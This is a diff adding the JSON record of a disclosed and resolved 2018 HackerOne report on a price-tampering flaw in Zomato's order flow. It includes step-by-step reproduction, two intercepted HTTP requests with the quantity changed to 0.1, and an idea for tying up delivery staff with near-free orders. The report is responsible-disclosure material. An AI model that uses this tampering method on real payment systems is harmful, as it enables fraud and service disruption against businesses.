@@ -1,0 +1,123 @@
+{
+  "id": 403783,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM3ODM=",
+  "url": "https://hackerone.com/reports/403783",
+  "title": "[www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-01T09:51:42.131Z",
+  "submitted_at": "2018-09-01T09:51:42.131Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "akhil-reni",
+    "url": "/akhil-reni",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2943,
+    "url": "https://hackerone.com/eternal",
+    "handle": "eternal",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Eternal",
+      "twitter_handle": "Zomato",
+      "website": "https://www.eternal.com",
+      "about": "Eternal is India’s largest new-age tech company by market cap, comprising of 4 businesses (as of now) – Zomato, Blinkit, District, & Hyperpure."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-09-17T09:58:51.514Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-17T09:58:51.285Z",
+  "team_member_agreed_on_going_public_at": "2018-09-16T02:07:04.879Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Hi, Team**,\n\nLike discussed with Prateek I am dropping the report here. \n\n**Summary:** \nLike the **title** says using this vulnerability one could order food at negligible price or keep all delivery executives busy.\n\n**Description:**\nWhile fuzzing my way through the payment flow on Zomato orders I came across a couple of interesting bugs that can be escalated to security vulnerabilities. \n\n██████ **███████**\n█████████\n\n█████████**This is a Security Issue** But when we set a quantity to a decimal number, for example: let's say I am trying to order 1 Biryani that costs 99₹, I can set the quantity to 0.1 and now the order price will total to 9.9₹. \nTo verify the vulnerability I did two orders:\n\n- One, ordered at the price of 0.1 quantity - Order got cancelled.\n\n{███████}\n\n- Two, ordered at the price of 0.6 quantity - Order got successfull delivered.\n\n{████}\n\n{████}\n\nBut in both the cases delivery executives were assigned, that basically means that one could spend as low as 10 rupees and keep all zomato executives in my area busy/occupied.\n\n**Platform(s) Affected:** Website (probably mobile too, if it's the same flow)\n\n## Browsers Verified In [If Applicable]:\n\nN/A\n\n## Steps To Reproduce:\n\n████ Select any resturant \n██████Select any food item from the menu and click continue\n\n{██████████}\n\n3) Intercept the HTTP requests, click select net banking\n4) You'll come across the following request, change the quantity to 0.1 (to be on stealth mode, change the quantity to 0.6)\n\n```\nPOST /php/o2_handler.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\ncontent-type: application/x-www-form-urlencoded;charset=UTF-8\norigin: https://www.zomato.com\nContent-Length: 825\nCookie: <redacted>\nConnection: close\n\n████████&order%5Bdishes%5D%5B0%5D%5Btype%5D=dish&order%5Bdishes%5D%5B0%5D%5Bcomment%5D=&order%5Bdishes%5D%5B0%5D%5Bitem_id%5D=481238585&order%5Bdishes%5D%5B0%5D%5Bitem_name%5D=Veg%20Biryani%20%5BRegular%5D&order%5Bdishes%5D%5B0%5D%5Bmrp_item%5D=0&order%5Bdishes%5D%5B0%5D%5Bquantity%5D=1&order%5Bdishes%5D%5B0%5D%5Btags%5D=1&order%5Bdishes%5D%5B0%5D%5Btax_inclusive%5D=0&order%5Bdishes%5D%5B0%5D%5Bunit_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Btotal_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Bis_bogo_active%5D=false&order%5Bdishes%5D%5B0%5D%5BbogoItemsCount%5D=0&order%5Bdishes%5D%5B0%5D%5BalwaysShowOnCheckout%5D=0&order%5Bdishes%5D%5B0%5D%5Bduration_id%5D=0&res_id=███████&address_id=██████&voucher_code=&payment_method_type=&payment_method_id=0&card_bin=&case=calculatecart&csrfToken=███████\n```\n{██████████}\n\n5) Click pay and you'll come across the following request. Change the quantity again to 0.1 (or whatever quantity you entered in the previous step)\n\n```\nPOST /php/o2_handler.php HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\ncontent-type: application/x-www-form-urlencoded;charset=UTF-8\norigin: https://www.zomato.com\nContent-Length: 2444\nCookie: <redacted>\nConnection: close\n\ncase=makeonlineorder&res_id=█████████&order={\"charges\":[{\"item_name\":\"Delivery Charge\",\"total_cost\":10,\"type\":\"charge\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":96623,\"display_cost\":\"â¹10\"}],\"taxes\":[{\"item_name\":\"Taxes\",\"total_cost\":0.6,\"type\":\"tax\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":0,\"display_cost\":\"â¹0.60\"}],\"subtotal2\":[{\"item_name\":\"Subtotal\",\"total_cost\":12,\"type\":\"subtotal2\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":0,\"display_cost\":\"â¹12.00\"}],\"total\":[{\"item_name\":\"Grand Total\",\"total_cost\":\"22.60\",\"type\":\"total\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":0,\"display_cost\":\"â¹22.60\"}],\"dishes\":[{\"type\":\"dish\",\"comment\":\"\",\"groups\":[],\"item_id\":481238585,\"item_name\":\"Veg Biryani [Regular]\",\"mrp_item\":0,\"quantity\":0.1,\"tags\":\"1\",\"tax_inclusive\":0,\"unit_cost\":120,\"total_cost\":120,\"is_bogo_active\":false,\"bogoItemsCount\":0,\"alwaysShowOnCheckout\":0,\"duration_id\":0}]}&██████\n```\n\n{████████}\n\n6) You'll be redirected to payment gateway, pay the amount. \n7) If the restaurant hasn't noticed the quantity then the order will be delivered successfully.\n\n\n## Supporting Material/References:\nOrder ID - ██████ (which got delivered as POC)\n\n## Impact\n\nThe impact is:\n1 - Order food for a negligible amount\n2 - Or make indefinite orders at a very low price by setting quantity to 0.02. The orders will go through, and you keep all delivery executives busy this way in one single area. This can be a business risk cause all new orders have to wait until a delivery executive is assigned to them.\n\nPS: Setting the severity to high, you can give it a right tag once you discuss the worse case scenario internally.",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 76,
+  "voters": [
+    "k0ns0l",
+    "ezzra",
+    "0xdr",
+    "ali",
+    "tess",
+    "sameerphad72",
+    "mohaned0101",
+    "spam404",
+    "thalaivar304",
+    "aryan2808",
+    "and 66 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 383,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.zomato.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
